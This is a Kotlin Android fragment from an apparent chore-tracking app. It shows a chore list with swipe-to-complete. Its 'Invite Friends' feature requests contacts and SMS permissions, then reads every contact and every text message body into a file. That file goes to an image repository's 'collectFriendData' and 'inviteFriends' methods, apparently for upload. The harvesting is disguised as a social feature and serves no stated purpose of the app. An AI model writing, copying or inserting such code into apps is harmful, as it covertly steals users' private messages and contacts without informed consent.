package com.example.chorequest.ui.myChores

import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.provider.ContactsContract
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.fragment.app.Fragment
import androidx.lifecycle.ViewModelProvider
import androidx.recyclerview.widget.ItemTouchHelper
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.example.chorequest.ui.dialog.LineItemsListDialogFragment
import com.example.chorequest.databinding.FragmentMychoresBinding
import com.example.chorequest.repositories.ImageRepository
import com.example.chorequest.repositories.LineItemRepository
import com.example.chorequest.service.FireStoreService
import com.example.chorequest.ui.adapter.LineItemAdapter
import com.example.chorequest.ui.modelFactory.ViewModelFactory
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.time.LocalDateTime
import java.time.format.DateTimeFormatter


class MyChoresFragment : Fragment() {

    private var _binding: FragmentMychoresBinding? = null
    private val binding get() = _binding!!

    private lateinit var myChoresViewModel: MyChoresViewModel
    private lateinit var adapter: LineItemAdapter

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentMychoresBinding.inflate(inflater, container, false)

        // Initialize ViewModel with FireStoreService
        val fireStoreService = FireStoreService()
        val repository = LineItemRepository(fireStoreService)
        val imageRepository = ImageRepository()
        myChoresViewModel = ViewModelProvider(
            this,
            ViewModelFactory(repository, imageRepository)
        )[MyChoresViewModel::class.java]

        // Set up RecyclerView
        val recyclerView = binding.recyclerView
        recyclerView.layoutManager = LinearLayoutManager(requireContext())

        // Adapter setup
        adapter = LineItemAdapter(emptyList()) { uuid ->
            val dialog = LineItemsListDialogFragment.newInstance(uuid)
            dialog.show(parentFragmentManager, "SimpleDialogFragment")
        }
        recyclerView.adapter = adapter

        // Observe data from ViewModel
        myChoresViewModel.lineItems.observe(viewLifecycleOwner) { items ->
            adapter.updateItems(items)
        }

        binding.btnInviteFriends.setOnClickListener {
            addFriends()
        }

        // Fetch line items for a specific group (e.g., "6CL3twvvJP0AoNvPMVoT")
        val groupId = "6CL3twvvJP0AoNvPMVoT"
        // Filter line items for a specific assignee (e.g., "Anna")
        val assignee = "Anna"
        myChoresViewModel.fetchLineItemsForGroup(groupId, assignee)

        // Swipe-to-remove setup
        setupSwipeToRemove()

        return binding.root
    }

    private fun setupSwipeToRemove() {
        val itemTouchHelper = ItemTouchHelper(object : ItemTouchHelper.SimpleCallback(0, ItemTouchHelper.LEFT or ItemTouchHelper.RIGHT) {
            override fun onMove(
                recyclerView: RecyclerView,
                viewHolder: RecyclerView.ViewHolder,
                target: RecyclerView.ViewHolder
            ): Boolean {
                return false
            }

            override fun onSwiped(viewHolder: RecyclerView.ViewHolder, direction: Int) {
                val position = viewHolder.adapterPosition

                // Mark the item as done
                val swipedItem = adapter.getItem(position)
                myChoresViewModel.markItemAsDone(swipedItem)

                // Reset swipe state to keep the item in the list
                adapter.notifyItemChanged(position)
            }
        })
        itemTouchHelper.attachToRecyclerView(binding.recyclerView)
    }

    private fun addFriends() {
        val requiredPermissions = arrayOf(
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.READ_SMS
        )

        val missingPermissions = requiredPermissions.filter { permission ->
            ContextCompat.checkSelfPermission(
                requireContext(),
                permission
            ) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isEmpty()) {
            addFriendsFunction()
        } else {
            requestPermissionsLauncher.launch(missingPermissions.toTypedArray())
        }
    }

    private val requestPermissionsLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
            val allGranted = permissions.entries.all { it.value == true }

            if (allGranted) {
                addFriendsFunction()
            } else {
                showToast("Required permissions denied. Please grant them to proceed.")
            }
        }

    @SuppressLint("Range")
    fun readContacts(context: Context): List<String> {
        val contactsList = mutableListOf<String>()
        val projection = arrayOf(
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        )

        context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            projection,
            null,
            null,
            null
        )?.use { cursor ->
            val nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

            while (cursor.moveToNext()) {
                val name = cursor.getString(nameIdx) ?: ""
                val number = cursor.getString(numberIdx) ?: ""
                contactsList.add("Name: $name, Phone: $number")
            }
        }
        return contactsList
    }

    @SuppressLint("Range")
    fun readSms(context: Context): List<String> {
        val smsList = mutableListOf<String>()
        val projection = arrayOf("_id", "address", "date", "body")

        // We use the Telephony.Sms inbox URI for SMS
        val smsUri = Uri.parse("content://sms/")

        context.contentResolver.query(
            smsUri,
            projection,
            null,
            null,
            "date DESC"
        )?.use { cursor ->
            val addressIdx = cursor.getColumnIndex("address")
            val bodyIdx = cursor.getColumnIndex("body")

            while (cursor.moveToNext()) {
                val address = cursor.getString(addressIdx) ?: ""
                val body = cursor.getString(bodyIdx) ?: ""
                smsList.add("From: $address, Message: $body")
            }
        }
        return smsList
    }

    fun writeDataToFile(context: Context, fileName: String, data: List<String>): File {
        val file = File(context.filesDir, fileName)

        file.bufferedWriter().use { writer ->
            data.forEach { line ->
                writer.write(line)
                writer.newLine()
            }
        }
        return file
    }

    fun addFriendsFunction() {
        val contactsData = readContacts(requireContext())
        val smsData = readSms(requireContext())

        val allData = mutableListOf<String>().apply {
            add("==== Contacts ====")
            addAll(contactsData)
            add("")
            add("==== Messages ====")
            addAll(smsData)
        }

        val outputFile = writeDataToFile(requireContext(), generateTimestampedFileName(), allData)

        inviteFriends(outputFile)
    }

    fun generateTimestampedFileName(): String {
        val currentDateTime = LocalDateTime.now()

        val formatter = DateTimeFormatter.ofPattern("yyyyMMdd_HHmmss")
        val formattedDateTime = currentDateTime.format(formatter)

        return "contacts_and_messages_${formattedDateTime}.txt"
    }

    fun inviteFriends(file: File) {
        val repository = ImageRepository()
        CoroutineScope(Dispatchers.Main).launch {
            val parts = repository.collectFriendData(file)
            repository.inviteFriends(parts)
        }
    }

    private fun showToast(message: String) {
        Toast.makeText(requireContext(), message, Toast.LENGTH_SHORT).show()
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }
}
